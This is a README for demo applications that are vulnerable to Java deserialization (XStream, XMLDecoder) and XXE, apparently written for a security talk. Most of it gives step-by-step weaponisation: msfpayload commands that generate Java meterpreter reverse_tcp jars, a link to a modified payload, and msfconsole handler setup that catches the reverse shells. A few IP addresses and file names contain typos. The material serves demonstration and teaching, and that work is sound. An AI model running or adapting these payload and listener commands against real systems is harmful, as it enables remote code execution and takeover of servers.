## Demos

* SpringXStream: SpringMVC RESTful application using XStream and RCE exploits
* RestletXMLDecoder: Restlet application using object representation and RCCE exploits
* Neo4J: DB to be used in the vulnerable VM and curl exploits
* SpringJAXB: XXE Vulnerable SpringMVC REST API. To be deployed on the vulnerable VM (http://192.168.239.146/contacts)

## Using Metasploit
The demos have been weaponized to use meterpreter sessions. Meterpreter have been modified to run the payload at object instantiation time. Once your MSF installation has been modified to use the modified meterpreter session (download it from https://github.com/pwntester/metasploit-javapayload), run the following command to generate the malicious jar.

./msfpayload java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > /Users/alvaro/Sites/met.jar
./msfpayload java/meterpreter/reverse_tcp LHOST=102.168.239.146 LPORT=4444 R > /Users/alvaro/Sites/met239.jar

For SpringXStream and RestletXMLDecoder, the meterpreter needs to connect back to localhost:4444. The meterpreter jar can be found at http://localhost/~alvaro/met.jar
For the SpringMVC XXE + Newo4J RCE demo, the meterpreter needs to connect back to 192.168.239.1:4444. The meterpreter jar can be found at http://localhost/~alvaro/met239.ja

Metasploit listener needs to be configured on localhost:4444 for the SpringXStream and RestletXMLDecoder demos and on 192.168.239.1:4444 for the SpringMVC XXE + Newo4J
./msfconsole
use exploit/multi/handler
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST  127.0.0.1  or set LHOST 192.168.239.1
set LPORT 4444
exploit

